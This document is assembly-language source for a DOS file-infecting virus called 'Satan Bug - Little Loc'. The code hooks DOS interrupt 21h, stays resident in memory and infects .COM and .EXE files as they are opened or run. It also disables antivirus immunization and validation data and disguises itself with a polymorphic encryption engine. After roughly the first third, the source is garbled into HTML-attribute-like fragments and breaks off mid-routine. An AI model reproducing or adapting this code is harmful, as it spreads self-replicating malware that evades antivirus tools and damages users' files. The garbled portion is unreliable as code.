

CSEG SEGMENT
     ASSUME CS:CSEG, ES:CSEG, SS:CSEG
     ORG 100H
YES     EQU 1
NO      EQU 0
COM     EQU 0
EXE     EQU 1
Signal  EQU 0F9H
Reply   EQU 0AC0AH

;               


Start:  CALL $+3  
        POP AX
        MOV CL,4H
        SHR AX,CL
        SUB AX,0010H
        MOV CX,CS
        ADD AX,CX
        PUSH AX
        MOV AX,OFFSET Begin
        PUSH AX
        RETF
JJumpFile:JMP JumpFile
Begin:  PUSH DS
BeginC: POP WORD PTR CS:[FileDS]        ;Save DS
        PUSH CS
        POP DS
        CMP BYTE PTR DS:[File],COM      ;Are we in a .COM file?
        JNE NoBytes
        MOV AX,DS:[Bytes]               ;Restore first 3 Bytes of program
        MOV WORD PTR ES:[100H],AX
        MOV AX,DS:[Bytes+2H]
        MOV WORD PTR ES:[102H],AX
NoBytes:PUSH CS                         
        POP ES
        MOV AH,Signal                   
        INT 21H                         ;Check if we're already in memory
        CMP AX,Reply
        JE JJumpFile
        CMP BYTE PTR DS:[CommandCom],YES  ;Are we in Command.COM
        JE NoEnv
        MOV ES,DS:[FileDS]
        MOV ES,ES:[002CH]
        XOR DI,DI
        MOV SI,OFFSET Comspec
        MOV CX,OFFSET Comspec@-OFFSET Comspec
        CLD
        REPE CMPSB                        ;Look for COMSPEC=
        JNE JJumpFile
        XOR AX,AX
        MOV CX,0080
        CLD
        REPNE SCASB
        JNE JJumpFile
        MOV CX,000CH
        SUB DI,CX
        CLD
        REP CMPSB               ;COMSPEC must equil COMMAND.COM
        JNE JJumpFile
NoEnv:  PUSH CS
        POP ES
        MOV AX,DS:[FileDS]         ;Segment of our current MCB
        DEC AX
MCBLoop:MOV DS,AX
        CMP BYTE PTR DS:[0H],'Z'   ;Last MCB?
        JNE JJumpFile
MCBEnd: MOV AX,(OFFSET Done-OFFSET Start)*2  ;Reserve enough for encryption
        ADD AX,3072
        MOV CL,4H
        SHR AX,CL
        INC AX
        SUB WORD PTR DS:[0003H],AX           ;Subtract it from MCB.size
        XOR BX,BX
        MOV ES,BX
        SHR AX,CL
        SHR CL,1H
        SHR AX,CL
        INC AX
        SUB WORD PTR ES:[413H],AX            ;Subtract it from Interrupt 12H
        MOV AX,DS:[0003H]
        MOV BX,DS
        INC BX
        ADD AX,BX
        SUB AX,0010H
        MOV DI,100H
        MOV SI,DI
        MOV ES,AX
        PUSH CS
        POP DS
        MOV CX,OFFSET Vend-OFFSET Start
        CLD
        REP MOVSB                            ;Copy us to high memory
        PUSH ES
        MOV AX,OFFSET HighCode
        PUSH AX
        RETF                                 ;Jump to high memory
JumpFile:CMP BYTE PTR CS:[File],COM
        MOV ES,CS:[FileDS]                   ;Restore Segments
        MOV DS,CS:[FileDS]
        JNE JumpEXE
        MOV AX,100H
        PUSH DS
        PUSH AX
        XOR AX,AX
        XOR BX,BX
        RETF
JumpEXE:MOV AX,DS
        ADD AX,0010H
        PUSH AX
        ADD AX,CS:[EXECS]
        MOV WORD PTR CS:[JumpDat+3H],AX
        MOV AX,CS:[EXEIP]
        MOV WORD PTR CS:[JumpDat+1H],AX
        POP AX
        ADD AX,CS:[EXESS]
        CLI
        MOV SS,AX
        MOV SP,CS:[EXESP]
        XOR AX,AX
        XOR BX,BX
        STI
        JMP SHORT JumpDat
JumpDat:DB 0EAH,00H,00H,00H,00H

HighCode:PUSH CS
        POP DS
        MOV BYTE PTR DS:[Busy_Flag],No       ;initialize Flag
        MOV AX,3521H                         ;Hook interrupt 21
        INT 21H
        MOV WORD PTR DS:[Vector21],BX        ;Save Vector
        MOV WORD PTR DS:[Vector21+2H],ES
        PUSH CS
        POP ES
        MOV DI,OFFSET JumpHandle
        MOV DX,DI
        MOV AL,0EAH                          ;Make jump to our handle
        CLD
        STOSB
        MOV AX,OFFSET Handle21
        CLD
        STOSW
        MOV AX,CS
        CLD
        STOSW
        MOV AX,2521H                         ;Point Interrupt 21 to Jump
        INT 21H
        JMP JumpFile                         ;Return to program


IDText:         DB 'Satan Bug virus - Little Loc',0H


File            DB ?            ;Current File: .COM = 0, .EXE = 1
CommandCom      DB ?            ; = YES If in COMMAND.COM
Bytes           DD ?            ;Bytes replaced with jump in .COM files
Comspec         DB 'COMSPEC='
Comspec@:
Command         DB 'COMMAND.COM',0H
Command@:       
EXESP           DW ?              ;.EXE SP
EXESS           DW ?              ;.EXE SS Displacement
EXECS           DW ?              ;.EXE CS Displacement
EXEIP           DW ?              ;.EXE IP
RANDOM          DW ?              ;Random Number
LAST            DW ?              ;Random Number Data
Immune:         DB 22H,19H,35H,93H,59H,57H,54H,80H   ;CPAV's Immune I.D.
Validate:       DB 0F1H,0FEH,0C6H,0ABH,0H,0F1H       ;Scan's Validation I.D.
Validate@:
ImmuneJumpExe:  DB 0E9H,8CH,01H        ;Write to .EXE's immunized with CPAV
ImmuneJumpCom:  DB 0E9H,75H,01H        ;Write to .COM's immunized with CPAV

Handle21Pall:POP ES           ;POP REGS  (They were pushed in the decryption)
        POP DS
        POP BP
        POP SI
        POP DI
        POP DX
        POP CX
        POP BX
        POP AX
Handle21:CMP BYTE PTR CS:[Busy_Flag],Yes  ;If Flag set skip
        JNE Handle21SF
        JMP CS:Vector21
Handle21SF:MOV BYTE PTR CS:[Busy_Flag],Yes  ;Set Flag
        CMP AH,3DH          ;Open?
        JE Open
        CMP AH,4BH           ;Execute?
        JE Execute
        CMP AH,6CH           ;Extended open?
        JE ExtOpen
        CMP AH,Signal        ;Signal?
        JNE Jump21
        MOV AX,Reply         ;Tell other that we're already here
        MOV BYTE PTR CS:[ReturnFar],YES    ;Used later
        JMP JumpEM
Jump21: MOV BYTE PTR CS:[ReturnFar],NO     ;Used Later
        JMP JumpEM

Open:   MOV WORD PTR CS:[FileSeg],DX            
        MOV WORD PTR CS:[FileSeg+2H],DS    ;Save SEG:OFF of file
        JMP InfStart
Execute:CMP AL,03H
        JBE Open
        JMP Jump21
ExtOpen:MOV WORD PTR CS:[FileSeg],SI       ;Save SEG:OFF of file
        MOV WORD PTR CS:[FileSeg+2H],DS
InfStart:PUSH AX
        PUSH BX
        PUSH CX
        PUSH DX
        PUSH DI
        PUSH SI
        PUSH BP
        PUSH DS
        PUSH ES
        CALL Infect
        MOV BYTE PTR DS:[ReturnFar],NO
        POP ES
        POP DS
        POP BP
        POP SI
        POP DI
        POP DX
        POP CX
        POP BX
        POP AX
JumpEM: MOV BYTE PTR CS:[Memory],YES       ;Tell encryption that we need
        JMP MemBuild                       ;to be encrypted in memory

Infect: CALL Which                         ;Determine if file is .EXE, .COM
        CMP AL,COM                         ; or other
        JNE MaybeEXE
        CALL InfCOM
        RETN
MaybeEXE:CMP AL,EXE
        JNE InfectRet
        CALL InfEXE
InfectRet:RETN

JWhichRetNone:JMP WhichRetNone
Which:  PUSH CS
        POP DS
        MOV WORD PTR DS:[JumpHandle+1H],OFFSET Handle21
        MOV BYTE PTR DS:[Opened],NO
        MOV BYTE PTR DS:[Attribute],NO
        MOV BYTE PTR DS:[Infected],NO
        MOV BYTE PTR DS:[CommandCom],NO
        MOV AX,2F00H
        CALL Call21
        MOV WORD PTR DS:[DTA],BX
        MOV WORD PTR DS:[DTA+2H],ES
        PUSH CS
        POP ES
        MOV DX,OFFSET NewDTA
        MOV AX,1A00H
        CALL Call21
        LDS DX,DS:[FileSeg]
        MOV AX,4E00H
        MOV CX,0027H
        CALL Call21
        PUSHF
        MOV AX,1A00H
        LDS DX,CS:[DTA]
        CALL Call21
        PUSH CS
        POP DS
        POPF
        JB JWhichRetNone
        CMP WORD PTR DS:[NewDTA+1CH],0H
        JNE WhichNoSize
        CMP WORD PTR DS:[NewDTA+1AH],1024
        JB JWhichRetNone
WhichNoSize:CMP BYTE PTR DS:[NewDTA+19H],0C8H  ;19xx+100 Years 
        JNB JWhichRetNone
        ADD BYTE PTR DS:[NewDTA+19H],0C8H ;ADD 100 Years to date
        TEST BYTE PTR DS:[NewDTA+15H],01H ;Read Only?
        LDS DX,DS:[FileSeg]
        JE NoAttr
        XOR CX,CX                         ;if yes, set to 0
        MOV AX,4301H
        CALL Call21
        JB WhichRetNone
        MOV BYTE PTR CS:[Attribute],YES
NoAttr: MOV AX,3D02H                       ;Open
        CALL Call21
        JB WhichRetNone
        PUSH CS
        POP DS
        MOV BYTE PTR DS:[Opened],YES
        MOV BX,AX
        MOV AX,3F00H                       ;Read first 20H bytes
        MOV CX,0020H
        MOV DX,OFFSET First20
        CALL Call21
        JB WhichRetNone
        CMP AX,CX
        JNE WhichRetNone
        CMP WORD PTR DS:[First20],'ZM'     ;Is it an .EXE style program?
        JE WhichRetEXE
        MOV DI,OFFSET NewDTA+1EH
        MOV CX,OFFSET Command@-OFFSET Command
        MOV SI,OFFSET Command
        PUSH DI
        PUSH SI
        CLD
        REP CMPSB                           ;Is it COMMAND.COM?
        POP SI
        POP DI
        JE RetCommand
        MOV CX,14
        XOR AX,AX
        CLD
        REPNE SCASB
        JNE WhichRetNone
        MOV CX,5H
        SUB DI,CX
        ADD SI,0007H
        CLD
        REP CMPSB                          ;Is it an .COM style program?
        JE WhichRetCOM
WhichRetNone:
        CALL Close
        XOR AX,AX
        DEC AX
        RETN
RetCommand:MOV BYTE PTR DS:[CommandCom],YES
WhichRetCOM:
        MOV AL,COM
        MOV BYTE PTR DS:[File],AL
        RETN
WhichRetEXE:    
        MOV AL,EXE
        MOV BYTE PTR DS:[File],AL
        RETN

PositionEnd:
        MOV AX,4202H            ;Set File Pointer to end
        XOR CX,CX
        MOV DX,CX
        CALL Call21
        CMP BYTE PTR DS:[File],COM
        JE NoDivide
        PUSH AX                  ;If .EXE then get Page size and modula data
        PUSH DX
        PUSH CX
        MOV CX,200H
        DIV CX
        INC AX
        CMP WORD PTR DS:[First20+4H],AX     ;Must be right in header or abort
        JNE HeaderError
        CMP WORD PTR DS:[First20+2H],DX
        JNE HeaderError
        POP CX
        POP DX
        POP AX
NoDivide:CALL FindScan                      ;Delete validation data (Viruscan)
        JB PosEndErr
        MOV CX,DX
        MOV DX,AX
        MOV AX,4200H
        CALL Call21
        TEST AX,000FH
        JE NoAdjust
        AND AX,0FFF0H                       ;Paragraph
        ADD AX,0010H
        MOV CX,DX
        MOV DX,AX
        MOV AX,4200H
        CALL Call21                          ;at end
NoAdjust:CMP BYTE PTR DS:[File],COM
        JNE NoSize
        OR DX,DX
        JNE PosEndErr
        CMP AX,65535-(OFFSET Done-OFFSET Start)-2048  ;.COM's must be < ja="" posenderr="" nosize:="" mov="" word="" ptr="" ds:[oldfilesize],ax="" mov="" word="" ptr="" ds:[oldfilesize+2h],dx="" mov="" byte="" ptr="" ds:[memory],no="" call="" build="" ;make="" encrypted="" copy="" of="" us="" mov="" ax,4000h="" ;write="" it="" to="" the="" file="" call="" call21="" jb="" posenderr="" mov="" byte="" ptr="" ds:[infected],yes="" mov="" ax,4201h="" xor="" cx,cx="" mov="" dx,cx="" call="" call21="" mov="" word="" ptr="" ds:[newfilesize],ax="" mov="" word="" ptr="" ds:[newfilesize+2h],dx="" xor="" ax,ax="" retn="" headererror:pop="" cx="" pop="" dx="" pop="" ax="" posenderr:xor="" ax,ax="" dec="" ax="" retn="" positionstart:="" mov="" ax,4200h="" xor="" cx,cx="" xor="" dx,dx="" call="" call21="" mov="" dx,offset="" first20="" mov="" cx,20h="" mov="" ax,4000h="" call="" call21="" jb="" posstaerr="" xor="" ax,ax="" retn="" posstaerr:xor="" ax,ax="" dec="" ax="" retn="" findscan:push="" ax="" push="" dx="" sub="" ax,75="" mov="" cx,dx="" mov="" dx,ax="" mov="" ax,4200h="" call="" call21="" mov="" dx,offset="" encrypt="" mov="" cx,75="" mov="" ax,3f00h="" call="" call21="" cmp="" ax,cx="" jne="" scanerr="" call="" scansearch="" or="" ax,ax="" jne="" findret="" pop="" dx="" pop="" ax="" sub="" ax,75="" add="" ax,di="" mov="" cx,dx="" mov="" dx,ax="" mov="" ax,4200h="" call="" call21="" push="" ax="" push="" dx="" mov="" ax,4000h="" mov="" cx,75="" sub="" cx,di="" mov="" di,offset="" decrypt="" mov="" dx,di="" push="" ax="" push="" cx="" xor="" ax,ax="" cld="" rep="" stosb="" pop="" cx="" pop="" ax="" call="" call21="" jb="" scanerr="" findret:clc="" pop="" dx="" pop="" ax="" retn="" scanerr:stc="" pop="" dx="" pop="" ax="" retn="" scansearch:mov="" al,0ffh="" call="" scandecrypt="" mov="" si,offset="" validate="" mov="" di,offset="" encrypt="" mov="" cx,76-(offset="" validate@-offset="" validate)="" cld="" lodsb="" searchcont:repne="" scasb="" jne="" searchneg="" push="" si="" push="" cx="" cld="" rep="" cmpsb="" pop="" cx="" pop="" si="" je="" searchyes="" jmp="" searchcont="" searchneg:mov="" al,1h="" call="" scandecrypt="" xor="" ax,ax="" dec="" ax="" retn="" searchyes:sub="" di,offset="" encrypt="" sub="" di,cx="" dec="" di="" mov="" al,1h="" call="" scandecrypt="" xor="" ax,ax="" retn="" scandecrypt:mov="" si,offset="" validate="" mov="" cx,offset="" validate@-offset="" validate="" scanlp:="" add="" byte="" ptr="" ds:[si],al="" inc="" si="" loop="" scanlp="" retn="" close:="" cmp="" byte="" ptr="" ds:[opened],no="" je="" noclose="" cmp="" byte="" ptr="" ds:[infected],yes="" jne="" nodate="" mov="" ax,5701h="" mov="" cx,ds:[newdta+16h]="" mov="" dx,ds:[newdta+18h]="" call="" call21="" nodate:="" mov="" ax,3e00h="" call="" call21="" noclose:cmp="" byte="" ptr="" ds:[attribute],no="" je="" nosetattr="" xor="" cx,cx="" mov="" cl,ds:[newdta+15h]="" test="" cl,1h="" je="" nosetattr="" mov="" ax,4301h="" lds="" dx,ds:[fileseg]="" call="" call21="" push="" cs="" pop="" ds="" nosetattr:retn="" disimmune:cmp="" byte="" ptr="" ds:[file],exe="" je="" exeimmune="" mov="" si,offset="" first20="" mov="" di,offset="" immunebytes="" mov="" cx,000eh="" cld="" rep="" movsb="" jmp="" immunecomp="" exeimmune:mov="" dx,ds:[first20+8h]="" mov="" cl,4h="" shl="" dx,cl="" mov="" ax,4200h="" xor="" cx,cx="" call="" call21="" mov="" ax,3f00h="" mov="" dx,offset="" immunebytes="" mov="" cx,0010h="" call="" call21="" cmp="" ax,cx="" jne="" disimmuneno="" immunecomp:mov="" di,offset="" immunebytes+6h="" mov="" si,offset="" immune="" mov="" cx,0008h="" cld="" rep="" cmpsb="" jne="" disimmuneyes="" cmp="" byte="" ptr="" ds:[file],exe="" jne="" immuneposcom="" jmp="" immuneposexe="" disimmuneno:xor="" ax,ax="" dec="" ax="" retn="" disimmuneyes:xor="" ax,ax="" retn="" immuneposcom:xor="" cx,cx="" mov="" dx,ds:[immunebytes+1h]="" sub="" dx,02f0h="" mov="" ax,4200h="" call="" call21="" jmp="" immunewrite="" immuneposexe:xor="" ax,ax="" mov="" dx,ds:[first20+8h]="" add="" dx,ds:[first20+16h]="" cmp="" dx,0fffh="" jb="" immunenor="" push="" dx="" and="" dx,0f000h="" mov="" ax,dx="" pop="" dx="" mov="" cl,4h="" rol="" ax,cl="" immunenor:mov="" cl,4h="" shl="" dx,cl="" add="" dx,ds:[first20+14h]="" jnb="" immunenoi="" inc="" ax="" immunenoi:add="" dx,0030h="" jnb="" immunenoi1="" inc="" ax="" immunenoi1:mov="" cx,ax="" mov="" ax,4200h="" call="" call21="" immunewrite:mov="" ax,4000h="" mov="" cx,0003h="" mov="" dx,offset="" immunejumpcom="" cmp="" byte="" ptr="" ds:[file],com="" je="" immunew="" mov="" dx,offset="" immunejumpexe="" immunew:call="" call21="" jb="" disimmuneno="" xor="" ax,ax="" retn="" infcom:="" call="" disimmune="" or="" ax,ax="" jne="" infcomclose="" mov="" ax,ds:[first20]="" mov="" word="" ptr="" ds:[bytes],ax="" mov="" ax,ds:[first20+2h]="" mov="" word="" ptr="" ds:[bytes+2h],ax="" call="" positionend="" or="" ax,ax="" jne="" infcomclose="" mov="" di,offset="" first20="" mov="" al,0e9h="" cld="" stosb="" mov="" ax,ds:[oldfilesize]="" sub="" ax,0003h="" cld="" stosw="" call="" positionstart="" infcomclose:call="" close="" retn="" infexe:="" call="" disimmune="" or="" ax,ax="" jne="" infexeclose="" cmp="" word="" ptr="" ds:[first20+0ch],-1="" jne="" infexeclose="" mov="" ax,ds:[first20+0eh]="" mov="" word="" ptr="" ds:[exess],ax="" mov="" ax,ds:[first20+10h]="" mov="" word="" ptr="" ds:[exesp],ax="" mov="" ax,ds:[first20+14h]="" mov="" word="" ptr="" ds:[exeip],ax="" mov="" ax,ds:[first20+16h]="" mov="" word="" ptr="" ds:[execs],ax="" call="" positionend="" or="" ax,ax="" jne="" infexeclose="" call="" fixheader="" call="" positionstart="" infexeclose:call="" close="" retn="" fixheader:mov="" ax,ds:[newfilesize]="" mov="" dx,ds:[newfilesize+2h]="" mov="" cx,200h="" div="" cx="" inc="" ax="" mov="" word="" ptr="" ds:[first20+2h],dx="" mov="" word="" ptr="" ds:[first20+4h],ax="" mov="" ax,ds:[oldfilesize]="" mov="" dx,ds:[first20+8h]="" mov="" cl,4h="" shl="" dx,cl="" sub="" ax,dx="" mov="" word="" ptr="" ds:[addseg],0h="" ip_cmp:="" cmp="" ax,65535-((offset="" done-offset="" start)+4096)="" jb="" noipman="" sub="" ax,0010h="" inc="" word="" ptr="" ds:[addseg]="" jmp="" short="" ip_cmp="" noipman:mov="" word="" ptr="" ds:[first20+14h],ax="" mov="" ax,ds:[oldfilesize+2h]="" cmp="" ax,000fh="" ja="" fixerror="" xchg="" al,ah="" shl="" ax,cl="" add="" ax,ds:[addseg]="" mov="" word="" ptr="" ds:[first20+16h],ax="" mov="" word="" ptr="" ds:[first20+0eh],ax="" mov="" word="" ptr="" ds:[first20+10h],0fffeh="" xor="" ax,ax="" retn="" fixerror:xor="" ax,ax="" dec="" ax="" retn="" call21:="" pushf="" call="" cs:vector21="" retn="" rnd:="" push="" cx="" rnd1:="" push="" ax="" xor="" ax,ax="" mov="" ds,ax="" pop="" ax="" add="" ax,ds:[46ch]="" push="" cs="" pop="" ds="" add="" ax,ds:[random]="" add="" cx,ax="" xchg="" al,ah="" test="" ax,cx="" je="" rnd2="" test="" ch,cl="" je="" rnd3="" add="" cx,ax="" rnd2:="" xchg="" cl,ch="" sub="" cx,ax="" sub="" word="" ptr="" ds:[random],ax="" cmp="" word="" ptr="" ds:[last],ax="" jne="" rndrt="" test="" cx,ax="" jne="" rnd3="" sub="" ah,cl="" add="" cx,ax="" test="" al,cl="" jne="" rnd3="" test="" word="" ptr="" ds:[random],ax="" je="" rnd3="" sub="" cx,ax="" rnd3:="" xchg="" al,ah="" sub="" cx,ax="" xchg="" cl,ch="" jmp="" rnd1="" rndrt:="" mov="" word="" ptr="" ds:[last],ax="" pop="" cx="" ret="" rnd@:="" membuild:push="" ax="" push="" bx="" push="" cx="" push="" dx="" push="" di="" push="" si="" push="" bp="" push="" ds="" push="" es="" push="" cs="" pop="" es="" push="" cs="" pop="" ds="" build:="" push="" bx="" call="" alttab="" mov="" di,offset="" decrypt="" and="" di,0fff0h="" add="" di,0010h="" mov="" word="" ptr="" ds:[doff],di="" mov="" word="" ptr="" ds:[eoff],offset="" encrypt="" cmp="" byte="" ptr="" ds:[memory],yes="" je="" callmh="" call="" head="" jmp="" short="" buildl="" callmh:="" call="" memhead="" buildl:="" call="" rnd="" and="" ax,001fh="" je="" buildl="" mov="" word="" ptr="" ds:[ecnt],ax="" mov="" word="" ptr="" ds:[inst],ax="" buildlp:call="" make="" dec="" word="" ptr="" ds:[ecnt]="" jne="" buildlp="" cmp="" byte="" ptr="" ds:[memory],yes="" je="" callmt="" call="" btail="" jmp="" short="" buildret="" callmt:="" pop="" ax="" jmp="" memtail="" buildret:pop="" bx="" retn="" build@:="" make:="" mov="" bx,offset="" etab="" call="" rnd="" and="" ax,001fh="" shl="" ax,1h="" add="" bx,ax="" mov="" si,ds:[bx]="" add="" si,offset="" etab="" inc="" si="" mov="" di,ds:[eoff]="" ;di="OFFSET" of="" encrypt+n="" mov="" ah,ds:[si-1h]="" mov="" cl,4h="" shr="" ah,cl="" ;get="" instruction="" size="" xor="" cx,cx="" mov="" cl,ah="" call="" rnd="" test="" ax,1h="" jne="" noswi="" push="" cx="" push="" di="" push="" si="" mov="" di,si="" add="" di,cx="" swlp:="" mov="" al,ds:[di]="" xchg="" ds:[si],al="" cld="" stosb="" inc="" si="" loop="" swlp="" pop="" si="" pop="" di="" pop="" cx="" noswi:="" mov="" dl,ds:[si-1h]="" test="" dl,00001000b="" je="" movint="" mov="" bx,offset="" lodsto="" mov="" al,ds:[bx]="" cld="" stosb="" jmp="" putadd="" movint:="" call="" rnd="" test="" al,1h="" jne="" putadd="" push="" si="" add="" si,cx="" dec="" si="" test="" dl,00000100b="" jne="" rotcl="" dec="" si="" test="" dl,00000010b="" jne="" rotcl="" dec="" si="" rotcl:="" test="" dl,1h="" je="" rotit="" dec="" si="" rotit:="" rcr="" byte="" ptr="" ds:[si],1h="" cmc="" rcl="" byte="" ptr="" ds:[si],1h="" add="" si,cx="" rcr="" byte="" ptr="" ds:[si],1h="" cmc="" rcl="" byte="" ptr="" ds:[si],1h="" pop="" si="" putadd:="" test="" dl,00000100b="" jne="" noadd="" push="" si="" add="" si,cx="" dec="" si="" test="" dl,00000010b="" jne="" adbyte="" call="" rnd="" dec="" si="" add="" word="" ptr="" ds:[si],ax="" add="" si,cx="" add="" word="" ptr="" ds:[si],ax="" pop="" si="" jmp="" noadd="" adbyte:="" call="" rnd="" add="" byte="" ptr="" ds:[si],al="" add="" si,cx="" add="" byte="" ptr="" ds:[si],al="" pop="" si="" noadd:="" push="" cx="" cld="" rep="" movsb="" pop="" cx="" test="" dl,00001000b="" jne="" putsto="" call="" putinc="" jmp="" mdec="" putsto:="" mov="" al,ds:[bx+1h]="" cld="" stosb="" mdec:="" mov="" word="" ptr="" ds:[eoff],di="" mov="" di,ds:[doff]="" mov="" byte="" ptr="" ds:[fillb],yes="" test="" dl,00001000b="" je="" decmov="" mov="" al,ds:[bx]="" cld="" stosb="" call="" fill="" decmov:="" cld="" rep="" movsb="" call="" fill="" test="" dl,00001000b="" je="" decinc="" mov="" al,ds:[bx+1h]="" cld="" stosb="" jmp="" decrt="" decinc:="" call="" putinc="" decrt:="" call="" fill="" cmp="" word="" ptr="" ds:[ecnt],1h="" jne="" savedi="" cmp="" byte="" ptr="" ds:[memory],yes="" jne="" nodecjmp="" call="" fill="" jmp="" short="" savedi="" nodecjmp:mov="" al,0ebh="" cld="" stosb="" xor="" ax,ax="" mov="" bx,di="" cld="" stosb="" mov="" ax,ds:[inst]="" shl="" ax,1h="" cmp="" ax,6h="" jbe="" savedi="" sub="" ax,0006h="" mov="" cx,ax="" call="" fill_num="" make_lp:call="" rnd="" test="" al,1h="" jne="" make_ni="" inc="" byte="" ptr="" ds:[bx]="" make_ni:loop="" make_lp="" savedi:="" mov="" word="" ptr="" ds:[doff],di="" mov="" byte="" ptr="" ds:[fillb],no="" retn="" make@:="" fill_num:push="" ax="" push="" bx="" push="" cx="" mov="" bx,offset="" ftable="" finlp:="" call="" rnd="" and="" ax,000fh="" xlat="" cld="" stosb="" loop="" finlp="" pop="" cx="" pop="" bx="" pop="" ax="" retn="" fill_num@:="" fill:="" push="" ax="" push="" bx="" push="" cx="" call="" rnd="" and="" ax,001fh="" mov="" cx,ax="" jcxz="" filrt="" mov="" bx,offset="" ftable="" filp:="" call="" rnd="" mov="" ah,0fh="" cmp="" byte="" ptr="" ds:[memory],yes="" jne="" andef="" mov="" ah,07h="" andef:="" and="" al,ah="" xlat="" cld="" stosb="" loop="" filp="" filrt:="" pop="" cx="" pop="" bx="" pop="" ax="" retn="" fill@:="" ftable:="" nop="" stc="" clc="" cmc="" cld="" sti="" nop="" ;sahf="" db="" 2eh="" db="" 3eh="" db="" 26h="" inc="" bx="" dec="" bx="" inc="" dx="" dec="" dx="" inc="" bp="" dec="" bp="" ftable@:="" putinc:="" push="" ax="" push="" cx="" push="" si="" mov="" cl,ds:[fillb]="" mov="" si,offset="" incdoff="" call="" rnd="" test="" al,01h="" je="" movinc="" add="" si,6h="" movinc:="" cld="" movsb="" jcxz="" nofil1="" call="" fill7="" nofil1:="" cld="" movsb="" jcxz="" nofil2="" call="" fill7="" nofil2:="" call="" rnd="" test="" al,1h="" je="" movinc1="" inc="" si="" inc="" si="" cld="" movsw="" jmp="" short="" movincr="" movinc1:cld="" movsb="" jcxz="" nofil3="" call="" fill7="" nofil3:="" cld="" movsb="" movincr:pop="" si="" pop="" cx="" pop="" ax="" retn="" putinc@:="" fill7:="" push="" ax="" push="" cx="" call="" rnd="" and="" ax,0007h="" mov="" cx,ax="" jcxz="" nofl7="" call="" fill_num="" nofl7:="" pop="" cx="" pop="" ax="" retn="" fill7@:="" btail:="" mov="" si,offset="" top="" call="" rnd="" mov="" cx,6h="" test="" al,1h="" je="" tailmov="" add="" si,cx="" tailmov:cld="" rep="" movsb="" mov="" ax,di="" sub="" ax,ds:[dec_start]="" ;tell="" tail="" where="" to="" jmp="" neg="" ax="" mov="" word="" ptr="" ds:[di-2h],ax="" mov="" word="" ptr="" ds:[doff],di="" mov="" bx,ds:[inst]="" shl="" bx,1h="" mov="" ax,di="" sub="" ax,bx="" ;how="" much="" of="" the="" decryption="" push="" ax="" ;="" to="" encrypt?="" push="" bx="" mov="" bx,offset="" ftable="" xor="" dx,dx="" tailsl:="" test="" di,000fh="" je="" tailpa="" call="" rnd="" and="" ax,000fh="" xlat="" stosb="" inc="" dx="" jmp="" tailsl="" tailpa:="" pop="" bx="" mov="" si,offset="" start="" mov="" cx,offset="" done-offset="" start="" cld="" rep="" movsb="" call="" rnd="" and="" ax,1h="" add="" di,ax="" mov="" ax,offset="" decrypt="" and="" ax,0fff0h="" add="" ax,0010h="" sub="" di,ax="" mov="" word="" ptr="" ds:[siz],di="" mov="" di,ds:[eoff]="" mov="" byte="" ptr="" ds:[di],0c3h="" mov="" ax,offset="" done-offset="" start="" add="" ax,bx="" add="" ax,dx="" xor="" dx,dx="" div="" word="" ptr="" ds:[inst]="" shr="" ax,1h="" mov="" cx,ax="" inc="" cx="" mov="" di,ds:[movcx]="" mov="" word="" ptr="" ds:[di],cx="" pop="" di="" push="" di="" mov="" bx,ds:[call_off]="" sub="" di,bx="" mov="" si,ds:[addsi]="" mov="" word="" ptr="" ds:[si],di="" pop="" di="" mov="" si,di="" taile:="" mov="" ax,offset="" encrypt="" call="" ax="" loop="" taile="" mov="" dx,offset="" decrypt="" and="" dx,0fff0h="" add="" dx,0010h="" mov="" cx,ds:[siz]="" retn="" btail@:="" incdoff:inc="" di="" inc="" di="" push="" di="" pop="" si="" mov="" si,di="" inc="" si="" inc="" si="" push="" si="" pop="" di="" mov="" di,si="" incdoff@:="" top:="" dec="" cx="" je="" top1="" jmp="" start="" top1:="" dec="" cx="" jcxz="" top@="" jmp="" start="" top@:="" head:="" mov="" byte="" ptr="" ds:[putcld],no="" mov="" byte="" ptr="" ds:[putcx],no="" mov="" byte="" ptr="" ds:[force],no="" mov="" byte="" ptr="" ds:[pushed],no="" mov="" bx,offset="" hop="" mov="" si,bx="" call="" call_em="" cld="" movsb="" push="" di="" xor="" ax,ax="" cld="" stosw="" mov="" word="" ptr="" ds:[call_off],di="" call="" rnd="" and="" ax,001fh="" mov="" cx,ax="" jcxz="" head_ncl="" call="" fill_num="" head_ncl:call="" putcl="" pop="" ax="" push="" bx="" mov="" bx,ax="" jcxz="" head_zer="" head_lp:call="" rnd="" test="" al,1h="" jne="" head_ni="" inc="" byte="" ptr="" ds:[bx]="" head_ni:loop="" head_lp="" head_zer:pop="" bx="" inc="" si="" inc="" si="" call="" rnd="" and="" ax,0001h="" mov="" dx,ax="" cld="" lodsb="" or="" al,dl="" cld="" stosb="" call="" call_em="" cld="" movsb="" cld="" lodsb="" or="" al,dl="" cld="" stosb="" xor="" ax,ax="" mov="" word="" ptr="" ds:[addsi],di="" cld="" stosw="" call="" call_em="" call="" rnd="" test="" al,1h="" jne="" head_e="" cld="" lodsb="" or="" al,dl="" cld="" stosb="" call="" call_em="" mov="" al,ds:[bx+3h]="" mov="" dh,dl="" neg="" dh="" inc="" dh="" or="" al,dh="" cld="" stosb="" jmp="" short="" head_e1="" head_e:="" inc="" si="" cld="" movsb="" cld="" lodsb="" mov="" cl,4h="" shl="" ax,cl="" push="" cx="" mov="" cl,dl="" shl="" al,cl="" pop="" cx="" shr="" ax,cl="" cld="" stosb="" head_e1:mov="" byte="" ptr="" ds:[force],yes="" call="" call_em="" mov="" word="" ptr="" ds:[doff],di="" mov="" word="" ptr="" ds:[dec_start],di="" retn="" call_em:call="" fill="" call="" putcl="" retn="" head@:="" hop:="" db="" 0e8h="" ;call="" db="" 0fch="" ;cld="" db="" 0b9h="" ;mov="" cx,="" db="" 5eh="" ;pop="" si="" 5fh="POP" di="" db="" 81h="" ;add="" db="" 0c6h="" ;si="" c7h="DI" db="" 56h="" ;push="" si="" 57h="PUSH" di="" db="" 89h="" ;mov="" db="" 0f7h="" ;di,si="" 0feh="SI,DI" db="" 06h="" ;push="" es="" db="" 0eh="" ;push="" cs="" db="" 1fh="" ;pop="" ds="" db="" 0eh="" ;push="" cs="" db="" 07h="" ;pop="" es="" hop@:="" putcl:="" push="" ax="" call="" rnd="" cmp="" byte="" ptr="" ds:[force],yes="" je="" putcl_f="" test="" al,01h="" jne="" putcl_no="" putcl_f:cmp="" byte="" ptr="" ds:[putcld],yes="" je="" putcl_no="" mov="" al,ds:[bx+1h]="" cld="" stosb="" call="" fill="" mov="" byte="" ptr="" ds:[putcld],yes="" putcl_no:call="" rnd="" cmp="" byte="" ptr="" ds:[force],yes="" je="" putcl_f1="" test="" al,1h="" jne="" 